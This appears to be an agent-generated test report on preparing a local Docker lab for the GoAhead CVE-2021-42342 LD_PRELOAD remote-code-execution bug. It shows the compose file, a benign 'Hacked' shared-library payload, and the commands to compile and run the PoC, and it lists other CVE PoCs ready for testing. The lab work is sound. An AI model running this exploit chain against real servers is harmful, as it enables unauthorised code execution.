# Docker PoC Test Report

**Generated:** 2026-02-22
**Test Target:** GoAhead CVE-2021-42342 (LD_PRELOAD Injection RCE)

---

## Test Environment

| Component | Status | Details |
|-----------|--------|---------|
| Docker | ❌ Not Available | Docker command not found in environment |
| GCC | ✅ Available | gcc 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04) |
| Python3 | ✅ Available | Required for PoC script |
| requests module | ⚠️ Needs verification | Used by poc.py |

---

## Vulnerability Details

**CVE-2021-42342** - GoAhead Web Server LD_PRELOAD Injection

| Property | Value |
|----------|-------|
| **CVSS** | High (RCE) |
| **Affected Versions** | GoAhead 4.x, 5.x < 5.1.5 |
| **Attack Vector** | Network (HTTP POST) |
| **Vulnerable Component** | File upload filter |
| **Impact** | Arbitrary code execution via LD_PRELOAD hijacking |

### Description
An issue was discovered in GoAhead 4.x and 5.x before 5.1.5. In the file upload filter, user form variables can be passed to CGI scripts without being prefixed with the CGI prefix. This permits tunneling untrusted environment variables into vulnerable CGI scripts.

---

## Test Setup Verification

### 1. Docker Compose File ✅

**Location:** `local_repos/vulnerability/GoAhead/CVE-2021-42342/docker/docker-compose.yml`

```yaml
version: '2'
services:
 web:
   image: vulhub/goahead:5.1.4
   ports:
    - "8080:80"
   volumes:
    - ./index:/var/www/goahead/cgi-bin/index
```

**Status:** Valid docker-compose configuration
- Exposes port 8080 (host) → 80 (container)
- Uses vulhub/goahead:5.1.4 (vulnerable version)
- Mounts CGI script volume

### 2. Payload Source ✅

**Location:** `local_repos/vulnerability/GoAhead/CVE-2021-42342/payload.c`

```c
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World\r\n\r\n", 16);
    write(1, "Hacked\n", 7);
}
```

**Status:** Valid payload source code

### 3. Compiled Payload ✅

**Location:** `local_repos/vulnerability/GoAhead/CVE-2021-42342/docker/payload.so`

```
-rwxrwxr-x 1 crpo_readonly_cuda122 crpo_readonly_cuda122 14416 Feb 22 15:29 payload.so
```

**Compilation Command:**
```bash
gcc -s -shared -fPIC payload.c -o payload.so
```

**Status:** ✅ Successfully compiled (14,416 bytes)

### 4. PoC Script ✅

**Location:** `local_repos/vulnerability/GoAhead/CVE-2021-42342/docker/poc.py`

**Key Features:**
- Raw socket HTTP POST request
- Multipart/form-data payload
- LD_PRELOAD injection via form field
- SSL/TLS support

**Usage:**
```bash
python3 poc.py http://localhost:8080/cgi-bin/index ./payload.so
```

**Status:** ✅ Script updated with CLI argument support

---

## Test Execution Status

| Step | Status | Notes |
|------|--------|-------|
| 1. Check Docker | ❌ Failed | Docker not available in environment |
| 2. Compile payload | ✅ Success | payload.so compiled (14KB) |
| 3. Start container | ⏸️ Skipped | Requires Docker |
| 4. Wait for service | ⏸️ Skipped | Requires running container |
| 5. HTTP check | ⏸️ Skipped | Requires running container |
| 6. Run PoC | ⏸️ Skipped | Requires running container |

---

## Manual Test Instructions

When Docker becomes available, run:

```bash
# 1. Navigate to the test directory
cd /mnt/nvme/wj_code/dl_scan/awesome-hacking-lists/local_repos/vulnerability/GoAhead/CVE-2021-42342/docker

# 2. Start the vulnerable container
docker-compose up -d

# 3. Wait for service (should be ~10 seconds)
docker-compose ps

# 4. Verify HTTP service
curl http://localhost:8080/
curl http://localhost:8080/cgi-bin/index

# 5. Run the PoC
python3 poc.py http://localhost:8080/cgi-bin/index ./payload.so

# Expected output should include:
# - HTTP response headers
# - "Hello: World"
# - "Hacked"

# 6. Cleanup
docker-compose down -v
```

---

## Alternative Test Script

An automated test script is available:

```bash
python3 /mnt/nvme/wj_code/dl_scan/awesome-hacking-lists/test_goahead_cve.py
```

This script will:
1. Check Docker availability
2. Compile the payload
3. Start the container
4. Wait for the service
5. Run the PoC
6. Verify RCE
7. Cleanup

---

## Other Testable CVEs

The following CVEs are also ready for testing:

| CVE | Path | Port |
|-----|------|------|
| CVE-2023-4596 | `vulnerability/WordPress/Forminator/CVE-2023-4596/` | 8000 |
| CVE-2021-36394 | `VulPOC/Moodle/CVE-2021-36394 Pre-Auth RCE in Moodle/` | 80 |
| CVE-2022-28346 | `VulPOC/Django/Django 核心 SQL 注入（CVE-2022-28346）/` | 10101 |
| CVE-2023-22515 | `security-labs-pocs/proof-of-concept-exploits/confluence-cve-2023-22515/` | 8090 |
| CVE-2022-26134 | `security-labs-pocs/proof-of-concept-exploits/confluence-cve-2022-26134/` | 8090 |
| CVE-2022-0543 | `vulnerability/Redis/CVE-2022-0543/` | 6379 |
| CVE-2022-22947 | `vulnerability/Spring/CVE-2022-22947/pocsuite/docker/` | 8080 |

---

## Conclusion

**Current Status:** Setup Complete, Awaiting Docker

All components for testing CVE-2021-42342 are prepared:
- ✅ Vulnerable Docker image identified
- ✅ docker-compose.yml configured
- ✅ Payload compiled successfully
- ✅ PoC script ready
- ✅ Test automation script created

**Next Step:** Run on a Docker-enabled environment to verify the full exploit chain.

---

## Files Summary

| File | Purpose | Status |
|------|---------|--------|
| `docker-compose.yml` | Container orchestration | ✅ Ready |
| `poc.py` | Exploit script | ✅ Ready |
| `payload.c` | Shellcode source | ✅ Ready |
| `payload.so` | Compiled payload | ✅ Compiled |
| `test_goahead_cve.py` | Automated test | ✅ Ready |
| `README.md` | Documentation | ✅ Present |

---

**Report Generated by:** Security Content Discovery Agent
**Test Environment:** /mnt/nvme/wj_code/dl_scan/awesome-hacking-lists
